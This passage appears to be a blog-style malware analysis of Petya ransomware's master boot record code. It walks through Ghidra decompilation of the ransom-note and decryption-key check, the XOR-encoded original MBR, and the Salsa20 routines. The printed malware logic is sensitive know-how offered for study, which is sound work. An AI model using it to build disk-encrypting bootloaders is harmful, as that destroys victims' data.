                              KEYBOARD - CHECK BUFFER, DO NOT CLEAR
                              Return: ZF clear if character in buffer
                              AH = scan code, AL = character
                              ZF set if no character in buffer
       0000:8afc cd  16           INT        0x16
       0000:8afe 74  04           JZ         LAB_0000_8b04 ; if ZF is set, no key is waiting
       0000:8b00 c6  46  fe       MOV        byte ptr [BP  + local_4 ],0x1 ; if there is key
                 01
                             LAB_0000_8b04                                   XREF[1]:     0000:8afe (j)   
       0000:8b04 8a  46  fe       MOV        AL ,byte ptr [BP  + local_4 ]
       0000:8b07 c9              LEAVE
       0000:8b08 c3              RET
```

## Keyboard Handling

In the following snippet, the check is done is a loop if no key is waiting. It loops back and repeats the check. Once a key is detected, the AH register is set to 0 and make a BIOS call that reads the key from the keyboard. The key press is returned via AL as ASCII and AH as scan code. ASCII character is stored in `local_6` while the scan code in `local_4`. ASCII character is stored into AL before returning.

```c
       0000:8ace e8  21  00       CALL       CheckBuffer_0000_8af2                            undefined CheckBuffer_0000_8af2(
       0000:8ad1 0a  c0           OR         AL ,AL
       0000:8ad3 74  f9           JZ         LAB_0000_8ace


       0000:8ad5 b4  00           MOV        AH ,0x0
                             Returns AH = scan code, AL = character
                             Keyboard - Read char from buffer, wait if empty
       0000:8ad7 cd  16           INT        0x16



       0000:8ad9 88  46  fe       MOV        byte ptr [BP  + local_4 ],AL
       0000:8adc 88  66  fc       MOV        byte ptr [BP  + local_6 ],AH
       0000:8adf 83  7e  04       CMP        word ptr [BP  + param_1 ],0x0
                 00
       0000:8ae3 74  08           JZ         LAB_0000_8aed
       0000:8ae5 8b  5e  04       MOV        BX ,word ptr [BP  + param_1 ]
       0000:8ae8 8a  46  fc       MOV        AL ,byte ptr [BP  + local_6 ]
       0000:8aeb 88  07           MOV        byte ptr [BX ],AL
                             LAB_0000_8aed                                   XREF[1]:     0000:8ae3 (j)   
       0000:8aed 8a  46  fe       MOV        AL ,byte ptr [BP  + local_4 ]
       0000:8af0 c9              LEAVE
       0000:8af1 c3              RET

```
## Do Key Check and Decrypt

This function validates the input key by (for example) comparing it against an internal lookup table and possibly using it to decrypt part of the disk.

```c
void __cdecl16near RansomNote_and_enter_key_0000_858e(undefined2 param_1,undefined param_2)

{
  byte bVar1;
  uint3 uVar2;
  char result;
  undefined2 uVar3;
  undefined2 unaff_BP;
  undefined2 unaff_SS;
  undefined local_24e [41];
  undefined local_225 [128];
  undefined local_1a5 [343];
  undefined local_4e [75];
  char local_3;
  
  _local_3 = CONCAT21(unaff_BP,local_3);
  FUN_0000_8838();
  biosExtDiskAccess_0000_8db2(CONCAT11((char)((uint)local_24e >> 8),param_2),local_24e,0x36,0,1, 0);
  Print_String_Gray_FUN_0000_8736((char *)s_You_became_victim_of_the_PETYA_R_0000_994a);
  PrintLightGrayString_0000_87b8((undefined *)&DAT_0000_ffdc,0x50);
  Print_String_Gray_FUN_0000_8736((char *)s_The_harddisks_of_your_computer_h_0000_9978);
  Print_String_Gray_FUN_0000_8736(local_225);
  Print_String_Gray_FUN_0000_8736((char *)s_3._Enter_your_personal_decryptio_0000_9b76);
  FUN_0000_8a1c(local_1a5);
  Print_String_Gray_FUN_0000_8736((undefined *)&DAT_0000_9bae);
  FUN_0000_8ac2();
  Print_String_Gray_FUN_0000_8736((char *)s_If_you_already_purchased_your_ke_0000_9bb4);
  while( true ) {
    Print_String_Gray_FUN_0000_8736((char *)s_Key:_0000_9bf4);
    _local_3 = _local_3 & 0xffff00;
    do {
      local_4e[_local_3 & 0xff] = 0;
      bVar1 = local_3 + 1;
      uVar2 = _local_3 >> 8;
      _local_3 = CONCAT21((int)uVar2,bVar1);
    } while (bVar1 < 0x4a);
    uVar3 = Processing_KeyPress_0000_8b22(local_4e,0x49);
    result = Check_Input_Key_0000_8430
                       (param_1,CONCAT11((char)((uint)local_4e >> 8),param_2),local_4e,uVar3);
    if (result == '\x01') break;
    Print_String_Gray_FUN_0000_8736((char *)s_Incorrect_key!_Please_try_again._0000_9bfc);
  }
  return;
}
```






```c
       0000:8627 56              PUSH       SI
       0000:8628 e8  05  fe       CALL       Check_Input_Key_0000_8430                        undefined Check_Input_Key_0000_8
       0000:862b 83  c4  08       ADD        SP ,0x8
       0000:862e fe  c8           DEC        result
       0000:8630 74  09           JZ         LAB_0000_863b
       0000:8632 68  fc  9b       PUSH       s_Incorrect_key!_Please_try_again._0000_9bfc     = "\r\n Incorrect key! Please tr
       0000:8635 e8  fe  00       CALL       Print_String_Gray_FUN_0000_8736                  undefined Print_String_Gray_FUN_
       0000:8638 5b              POP        BX
       0000:8639 eb  b8           JMP        LAB_0000_85f3

```

Within `Check_Input_Key_0000_8430`, there is key check includes minimum length (>16 bytes).

There is some form of a lookup table in `[BL+0x9716]` would search for a match in that table. For each match, it would do some arithmetic which I am not able to understand.

> [!info]- `Check_Input_Key_0000_8430` Decompilation
> ```c
> 
> uint __cdecl16near
> Check_Input_Key_0000_8430
>           (undefined2 param_1,undefined param_2,char *input_key,byte length_of_input_key)
> 
> {
>   char cVar1;
>   int iVar2;
>   uint in_AX;
>   uint uVar3;
>   byte extraout_AH;
>   undefined2 in_CX;
>   undefined uVar4;
>   undefined2 unaff_SS;
>   undefined2 unaff_DS;
>   char local_436 [512];
>   undefined local_236;
>   char local_235 [32];
>   undefined local_215 [479];
>   char local_36 [32];
>   char local_16 [16];
>   undefined4 local_6;
>   
>   if (length_of_input_key < 0x10) {
> LAB_0000_843c:
>     uVar3 = in_AX & 0xff00;
>   }
>   else {
>     local_6 = 0;
>     while ((local_6._2_1_ < length_of_input_key && (local_6._1_1_ < 0x11))) {
>       local_6 = local_6 & 0xffffff00;
>       while (local_6._3_1_ < 0x36) {
>         if (*(char *)((uint)local_6._3_1_ + *(int *)0x9716) == input_key[local_6._2_1_]) {
>           local_6 = CONCAT31(local_6._1_3_,1);
>           break;
>         }
>         local_6 = CONCAT13(local_6._3_1_ + 1,(uint3)local_6);
>       }
>       if ((char)local_6 == '\x01') {
>         uVar3 = (uint)local_6._2_1_;
>         local_16[local_6._1_2_ & 0xff] = input_key[uVar3];
>         local_6 = (ulong)CONCAT21(local_6._2_2_,local_6._1_1_ + '\x01') << 8;
>       }
>       local_6._0_3_ = CONCAT12(local_6._2_1_ + '\x01',(int)local_6);
>       local_6 = (ulong)(uint3)local_6;
>     }
>     for (local_6 = 0; uVar4 = (undefined)((uint)in_CX >> 8), local_6 < 0x10; local_6 = local_6 + 1)
>     {
>       cVar1 = local_16[(int)local_6];
>       iVar2 = (int)local_6 * 2;
>       local_36[iVar2] = cVar1 + 'z';
>       in_CX = 0;
>       local_36[iVar2 + 1] = cVar1 * '\x02';
>     }
>     biosExtDiskAccess_0000_8db2
>               (CONCAT11((char)((uint)&local_236 >> 8),param_2),&local_236,0x36,0,1,0);
>     biosExtDiskAccess_0000_8db2(CONCAT11(uVar4,param_2),local_436,0x37,0,1,0);
>     Salsa20_crypt_transform_0000_90b2(local_36,local_215,0,local_436,0x200);
>     in_AX = 0;
>     for (local_6 = 0; local_6 < 0x200; local_6 = local_6 + 1) {
>       if (local_436[(int)local_6] != '7') goto LAB_0000_843c;
>     }
>     local_236 = 2;
>     for (local_6 = 0; local_6 < 0x20; local_6 = local_6 + 1) {
>       local_235[(int)local_6] = local_36[(int)local_6];
>     }
>     biosExtDiskAccess_0000_8db2
>               (CONCAT11((char)((uint)&local_236 >> 8),param_2),&local_236,0x36,0,1,1);
>     Print_String_Gray_FUN_0000_8736((char *)s__0000_9946);
>     Decrypt_MBR_0000_8206(param_1,CONCAT11((char)((uint)local_36 >> 8),param_2),local_36);
>     uVar3 = (uint)CONCAT31((uint3)extraout_AH,1);
>   }
>   return uVar3;
> }
> ```

This is where that lookup table is located at

![[Pasted image 20250301121013.png]]



## Encrypted Original MBR

This is found in Sector 0x37 (0x6e00) which is xor'd by 0x37!

![[Pasted image 20250301141947.png]]

After applying the XOR transformation, we can verify that it is true.

![[Pasted image 20250301142601.png]]

## Salsa20 or ChaCha20 ?

We see `expand 32-byte k` string in this function which is a hint that this function might be part of Salsa20 or ChaCha20. However, based on the key expansion, we see Salsa20's key expansion.

Based on the following decompilation, we can see that it is modelled closely to Salsa20 from https://github.com/alexwebr/salsa20/blob/master/salsa20.c#L60

```c

void __cdecl16near buildExpand32ByteBlock_0000_8fee(int param_1,int param_2,int param_3)

{
  int iVar1;
  int iVar2;
  undefined2 unaff_DS;
  undefined expand32byte_constant [4];
  undefined local_10;
  undefined local_f;
  undefined local_e;
  undefined local_d;
  undefined local_c;
  undefined local_b;
  undefined local_a;
  undefined local_9;
  undefined local_8;
  undefined local_7;
  undefined local_6;
  undefined local_5;
  int local_4;
  
  expand32byte_constant[1] = 0x78;
  expand32byte_constant[2] = 0x70;
  expand32byte_constant[3] = 0x61;
  local_10 = 0x6e;
  local_f = 100;
  local_d = 0x33;
  local_c = 0x32;
  local_b = 0x2d;
  local_a = 0x62;
  local_9 = 0x79;
  local_8 = 0x74;
  expand32byte_constant[0] = 0x65;
  local_7 = 0x65;
  local_e = 0x20;
  local_6 = 0x20;
  local_5 = 0x6b;
  iVar2 = 0;
  do {
    local_4 = iVar2;
    for (iVar1 = 0; iVar1 < 4; iVar1 = iVar1 + 1) {
      *(undefined *)(param_3 + iVar1 + iVar2) = expand32byte_constant[(iVar2 / 0x14) * 4 + iVar1] ;
    }
    iVar2 = iVar2 + 0x14;
  } while (iVar2 < 0x40);
  for (iVar2 = 0; iVar2 < 0x10; iVar2 = iVar2 + 1) {
    iVar1 = iVar2 + param_3;
    *(undefined *)(iVar1 + 4) = *(undefined *)(iVar2 + param_1);
    *(undefined *)(iVar1 + 0x2c) = ((undefined *)(iVar2 + param_1))[0x10];
    *(undefined *)(iVar1 + 0x18) = *(undefined *)(param_2 + iVar2);
  }
  salsa_hash__0000_8f7a(param_3);
  return;
}
```


Setting a breakpoint at 0x9082 and check dx for the location of the key:


![[Pasted image 20250301170454.png]]
We can see the Initial state of the key seen in https://en.wikipedia.org/wiki/Salsa20

| "expa" | Key    | Key    | Key    |
| ------ | ------ | ------ | ------ |
| Key    | "nd 3" | Nonce  | Nonce  |
| Pos.   | Pos.   | "2-by" | Key    |
| Key    | Key    | Key    | "te k" |
### Quarter Rounds

We can see all four quarter-round function in this round function!

![[Pasted image 20250301173303.png]]

I have also identified some core functions that are necessary for Salsa20.
- `quarterRoundFunction4Words_0000_8e0e`
- `RoundFunction_1_0000_8ec8`
- `salsa_hash__0000_8f7a`
- `RoundFunction_2_0000_8e68`
- `buildExpand32ByteBlock_0000_8fee`

> [!info] Salsa 20 Decompilation in Ghidra
> ```c
> void __cdecl16near quarterRoundFunction4Words_0000_8e0e(uint *a,uint *b,uint *c,uint *d)
> {
>   uint uVar1;
> 
>   uVar1 = rotate_left_0000_8df0(*d + *a,7);
>   *b = *b ^ uVar1;
>   uVar1 = rotate_left_0000_8df0(*b + *a,9);
>   *c = *c ^ uVar1;
>   uVar1 = rotate_left_0000_8df0(*b + *c,0xd);
>   *d = *d ^ uVar1;
>   uVar1 = rotate_left_0000_8df0(*d + *c,0x12);
>   *a = *a ^ uVar1;
>   return;
> }
> 
> 
> void __cdecl16near RoundFunction_1_0000_8ec8(int param_1)
> 
> {
>   quarterRoundFunction4Words_0000_8e0e(param_1,param_1 + 8,param_1 + 0x10,param_1 + 0x18);
>   quarterRoundFunction4Words_0000_8e0e(param_1 + 10,param_1 + 0x12,param_1 + 0x1a,param_1 + 2);
>   quarterRoundFunction4Words_0000_8e0e(param_1 + 0x14,param_1 + 0x1c,param_1 + 4,param_1 + 0xc);
>   quarterRoundFunction4Words_0000_8e0e(param_1 + 0x1e,param_1 + 6,param_1 + 0xe,param_1 + 0x16);
>   return;
> }
> 
> void __cdecl16near RoundFunction_2_0000_8e68(int param_1)
> {
> 
>   quarterRoundFunction4Words_0000_8e0e(param_1,param_1 + 2,param_1 + 4,param_1 + 6);
>   quarterRoundFunction4Words_0000_8e0e(param_1 + 10,param_1 + 0xc,param_1 + 0xe,param_1 + 8);
>   quarterRoundFunction4Words_0000_8e0e(param_1 + 0x14,param_1 + 0x16,param_1 + 0x10,param_1 + 0x 12);
>   quarterRoundFunction4Words_0000_8e0e(param_1 + 0x1e,param_1 + 0x18,param_1 + 0x1a,param_1 + 0x 1c);
>   return;
> }
> 
> void __cdecl16near salsa_hash__0000_8f7a(int param_1)
> {
>   int *piVar1;
>   int iVar2;
>   int iVar3;
>   int local_42 [16];
>   int local_22 [16];
>   
>   for (iVar3 = 0; iVar3 < 0x10; iVar3 = iVar3 + 1) {
>     iVar2 = combineTwoBytesIntoAX_0000_8f3c(iVar3 * 4 + param_1);
>     local_22[iVar3] = iVar2;
>     local_42[iVar3] = iVar2;
>   }
>   iVar3 = 0;
>   do {
>     DoubleRoundFunction_0000_8f28(local_22);
>     iVar3 = iVar3 + 1;
>   } while (iVar3 < 10);
>   iVar3 = 0;
>   do {
>     piVar1 = local_22 + iVar3;
>     *piVar1 = *piVar1 + local_42[iVar3];
>     storeWordAs4Bytes_0000_8f52(iVar3 * 4 + param_1,local_22[iVar3]);
>     iVar3 = iVar3 + 1;
>   } while (iVar3 < 0x10);
>   return;
> }
> 
> void __cdecl16near buildExpand32ByteBlock_0000_8fee(int param_1,int param_2,int param_3)
> 
> {
>   int iVar1;
>   int iVar2;
>   undefined2 unaff_DS;
>   undefined expand32byte_constant [4];
>   undefined local_10;
>   undefined local_f;
>   undefined local_e;
>   undefined local_d;
>   undefined local_c;
>   undefined local_b;
>   undefined local_a;
>   undefined local_9;
>   undefined local_8;
>   undefined local_7;
>   undefined local_6;
>   undefined local_5;
>   int local_4;
>   
>   expand32byte_constant[1] = 0x78;
>   expand32byte_constant[2] = 0x70;
>   expand32byte_constant[3] = 0x61;
>   local_10 = 0x6e;
>   local_f = 100;
>   local_d = 0x33;
>   local_c = 0x32;
>   local_b = 0x2d;
>   local_a = 0x62;
>   local_9 = 0x79;
>   local_8 = 0x74;
>   expand32byte_constant[0] = 0x65;
>   local_7 = 0x65;
>   local_e = 0x20;
>   local_6 = 0x20;
>   local_5 = 0x6b;
>   iVar2 = 0;
>   do {
>     local_4 = iVar2;
>     for (iVar1 = 0; iVar1 < 4; iVar1 = iVar1 + 1) {
>       *(undefined *)(param_3 + iVar1 + iVar2) = expand32byte_constant[(iVar2 / 0x14) * 4 + iVar1] ;
>     }
>     iVar2 = iVar2 + 0x14;
>   } while (iVar2 < 0x40);
>   for (iVar2 = 0; iVar2 < 0x10; iVar2 = iVar2 + 1) {
>     iVar1 = iVar2 + param_3;
>     *(undefined *)(iVar1 + 4) = *(undefined *)(iVar2 + param_1);
>     *(undefined *)(iVar1 + 0x2c) = ((undefined *)(iVar2 + param_1))[0x10];
>     *(undefined *)(iVar1 + 0x18) = *(undefined *)(param_2 + iVar2);
>   }
>   salsa_hash__0000_8f7a(param_3);
>   return;
> }
> ```
> 

## Demonstration of Overwritten MBR

![https://youtu.be/bZ5i9CsmxnE](https://youtu.be/bZ5i9CsmxnE)


# Conclusion

Had a better familiarity of analyzing MBR. One interesting point is to set breakpoints at `CreateFile` and look for the file path that is created like `PhysicalDrive0` and extracting these bytes out with tools like `winpmem` which worked like a charm. Using the script as shown in previous [[20250222215149 - BLG - Analysis on Destructive MEMZ's Master Boot Record (MBR)|Analysis on Destructive MEMZ's Master Boot Record (MBR)]] which help give a better disassembly in GDB has been of a really great help. 




# References

- [https://www.fortinet.com/blog/threat-research/petya-s-master-boot-record-infection](https://www.fortinet.com/blog/threat-research/petya-s-master-boot-record-infection)
- https://en.wikipedia.org/wiki/INT_13H
- https://en.wikipedia.org/wiki/INT_10H
-  https://wiki.osdev.org/Disk_access_using_the_BIOS_(INT_13h)
- 

![](https://youtu.be/9A7qjmdftBc?si=8O5ubGfc50UZTNmi)

![](https://youtu.be/jRj_HzbHeWU?si=rBztWIeRMtnIgHhN)

